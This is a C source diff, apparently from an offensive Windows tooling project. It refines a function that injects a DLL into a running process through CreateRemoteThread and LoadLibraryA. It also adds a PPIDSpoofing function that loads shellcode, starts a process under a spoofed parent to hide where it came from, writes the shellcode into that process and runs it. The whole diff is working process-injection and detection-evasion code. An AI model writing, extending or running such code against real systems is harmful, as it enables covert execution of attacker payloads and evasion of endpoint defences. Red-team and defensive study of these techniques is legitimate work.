@@ -71,7 +71,7 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	PVOID pLoadLibrary = NULL, pDllPathAddr = NULL;
 	char Pwd[MAX_PATH * 2], AbsolutePath[MAX_PATH*4];
 	HANDLE hThread = NULL, hProcess = NULL;
-	SIZE_T sShellcodePathSize;
+	SIZE_T sShellcodePathSize=0;
 	DWORD dwThreadId, dwProcessId;
 
 	if ((pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")) == NULL)
@@ -81,8 +81,8 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	if (!ObtainProcessHandle(dwEnumerationMethod, lpProcessName, &hProcess, &dwProcessId))
 		return FALSE;
 
-	// If it's relative path, prepend PWD to it
-	if (!IsAbsolutePath(lpShellcodePath))
+	//If it's relative path, prepend PWD to it
+	if (PathIsRelativeA(lpShellcodePath))
 	{
 		GetCurrentDirectoryA(MAX_PATH * 2, Pwd);
 		sprintf_s(AbsolutePath, MAX_PATH*4, "%s\\%s", Pwd, lpShellcodePath);
@@ -90,15 +90,45 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	}
 	sShellcodePathSize = lstrlenA(lpShellcodePath);
 
+	printf("[i] Injected %s DLL into the remote process\n", lpShellcodePath);
 	if (!AllocateMemory(NULL, hProcess, lpShellcodePath, sShellcodePathSize, &pDllPathAddr))
 		return FALSE;
 
 	if ((hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibrary, pDllPathAddr, NULL, &dwThreadId)) == NULL)
 		return ReportErrorWinAPI("CreateRemoteThread");
-	printf("[i] Injected DLL into the remote process via thread with ID %d\n", dwThreadId);
+	Sleep(100);
 
 	FreeMemory(dwMemoryType, hProcess, pDllPathAddr);
 	CloseHandle(hThread);
+
+	return TRUE;
+}
+
+BOOL PPIDSpoofing(IN LPCSTR lpProcessName, IN LPCSTR lpParentProcessName, IN LPCSTR lpShellcodePath)
+{
+	HANDLE hProcess, hThread;
+	DWORD dwThreadId;
+	PVOID pShellcode, pShellcodeAddr;
+	SIZE_T sShellcodeSize;
+
+	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
+		return FALSE;
+
+	if (!CreatePPIDSpoofedProcess(NULL, lpProcessName, lpParentProcessName, &hProcess, &hThread))
+		return FALSE;
+
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+		return FALSE;
+
+	if (!RunThread(hProcess, FALSE, pShellcodeAddr, &hThread, &dwThreadId))
+		return FALSE;
+
+	if (!WaitForThread(hThread))
+		return FALSE;
+
+	CloseHandle(hThread);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
+	LocalFree(pShellcode);
 
 	return TRUE;
 }
